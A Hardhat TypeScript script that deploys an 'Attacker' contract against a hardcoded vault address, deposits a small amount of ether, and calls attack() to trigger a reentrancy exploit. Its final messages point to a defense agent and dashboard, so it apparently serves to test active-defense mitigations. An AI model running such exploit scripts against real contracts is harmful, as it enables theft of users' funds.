import { ethers } from "hardhat";

const VAULT_ADDRESS = "0x596Ff2Ca0f781a2CED29EC685cD1ba038378dE02";
const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

async function main() {
  const [deployer] = await ethers.getSigners();
  console.log("Using account for attack simulation:", deployer.address);
  console.log("Targeting Vault Address:", VAULT_ADDRESS);

  // 1. Deploy the Attacker Contract
  console.log("\n[1] Deploying Malicious Attacker Contract...");
  const Attacker = await ethers.getContractFactory("Attacker");
  let attackerAddress = "";
  let retries = 3;
  while (retries > 0) {
    try {
      const deployTxData = await Attacker.getDeployTransaction(VAULT_ADDRESS);
      const tx = await deployer.sendTransaction(deployTxData);
      console.log("Tx hash:", tx.hash);
      console.log("Sleeping 20s for deployment to finalize on L2...");
      await sleep(20000);
      
      const receipt = await ethers.provider.getTransactionReceipt(tx.hash);
      if(receipt && receipt.contractAddress) {
        attackerAddress = receipt.contractAddress;
      } else {
        // Fallback calculation
        const nonce = await deployer.getNonce() - 1;
        attackerAddress = ethers.getCreateAddress({ from: deployer.address, nonce });
      }
      break;
    } catch (e: any) {
      console.log("Deploy threw error, retrying... Error:", e.message);
      retries--;
      if (retries === 0) throw e;
      await sleep(5000);
    }
  }
  
  const attacker = await ethers.getContractAt("Attacker", attackerAddress);
  console.log("Attacker deployed to:", attackerAddress);

  // 2. Deposit Funds (Setting the trap)
  console.log("\n[2] Depositing initial funds to Vault via Attacker...");
  const attackAmount = ethers.parseEther("0.00001");
  
  let depositTx;
  retries = 3;
  while (retries > 0) {
    try {
      depositTx = await attacker.depositToTarget({ value: attackAmount });
      console.log("Deposit Tx hash:", depositTx.hash);
      break;
    } catch (e: any) {
      console.log("Deposit threw error, retrying...", e.message);
      retries--;
      if (retries === 0) throw e;
      await sleep(5000);
    }
  }
  
  try {
    if(depositTx) await depositTx.wait(1);
  } catch(e) {
    console.log("Deposit wait threw, sleeping 15s...");
    await sleep(15000);
  }
  console.log("Deposit confirmed.");

  // 3. Trigger Reentrancy Attack
  console.log("\n[3] INITIATING REENTRANCY ATTACK LOOP...");
  console.log("Calling attack()...");
  
  let attackTx;
  retries = 3;
  while (retries > 0) {
    try {
      attackTx = await attacker.attack(attackAmount);
      console.log("Attack Tx hash:", attackTx.hash);
      break;
    } catch (e: any) {
      console.log("Attack threw error, retrying...", e.message);
      retries--;
      if (retries === 0) throw e;
      await sleep(5000);
    }
  }
  
  try {
    if(attackTx) await attackTx.wait(1);
  } catch(e) {
    console.log("Attack wait threw, sleeping 15s...");
    await sleep(15000);
  }
  
  console.log("\n=================================");
  console.log("ATTACK PAYLOAD EXECUTED ON-CHAIN");
  console.log("Monitor the Python Agent and Dashboard for Active Defense Mitigations!");
  console.log("=================================\n");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
